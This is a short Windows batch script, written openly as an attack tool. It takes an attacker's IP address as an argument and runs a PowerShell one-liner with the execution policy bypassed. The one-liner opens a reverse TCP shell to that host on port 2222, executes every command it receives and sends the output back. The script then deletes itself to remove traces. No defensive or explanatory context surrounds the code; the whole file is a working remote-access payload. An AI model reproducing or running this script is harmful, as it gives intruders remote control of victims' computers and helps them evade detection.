@echo off
:: Get the attacker's public IP from the argument
set attackerIP=%1

:: Set the attacker's port manually
set attackerPort=2222

:: Establish a reverse connection using PowerShell
powershell -NoProfile -ExecutionPolicy Bypass -Command "& { $client = New-Object System.Net.Sockets.TCPClient('%attackerIP%', %attackerPort%); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush() }; $client.Close() }"

:: Clean up after execution
del /f "%~f0"
